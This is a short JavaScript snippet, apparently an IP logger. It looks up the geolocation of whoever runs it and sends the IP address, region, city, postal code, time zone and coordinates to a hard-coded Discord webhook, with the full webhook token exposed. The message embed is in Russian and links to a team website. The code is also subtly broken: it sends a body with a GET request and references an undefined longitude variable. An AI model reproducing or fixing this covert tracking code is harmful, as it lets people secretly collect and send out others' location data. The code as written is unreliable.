fetch('https://api.2ip.ua/geo.json?ip', { method: "GET" }).then(res => res.json()).then(geo => {
	fetch('https://discord.com/api/webhooks/782001481410150424/A7mTIBPJ1K-M5-HDR7UOh9BrnjcGyxymET_tOgKJfSiINy8Y5UC8Ew8gTyh9Q3NJqlzt', {
		method: "GET",
		headers: {
			"Content-Type": "application/json"
		},
		body: JSON.stringify({ embeds: [
		    {
		      title: "Украина",
		      description: `**ip**: ${geo.ip}\n`+
		      `**Область**: ${geo.region_rus}\n`+
		      `**Город**: ${geo.city_rus}\n`+
		      `**Почтовый код**: ${geo.zip_code}\n`+
		      `**Время**: UTC${geo.time_zone} \n`+
		      `**Координаты**: X${geo.latitude}, Y${longitude}`,
		      url: `https://api.2ip.ua/geo.json?ip=${geo.ip}`,
		      color: 16382457,
		      footer: {
		        text: "https://deitysenpai.team",
		        icon_url: "https://deitysenpai.team/avatar"
		      }
		    }
		  ]
		})
	})
})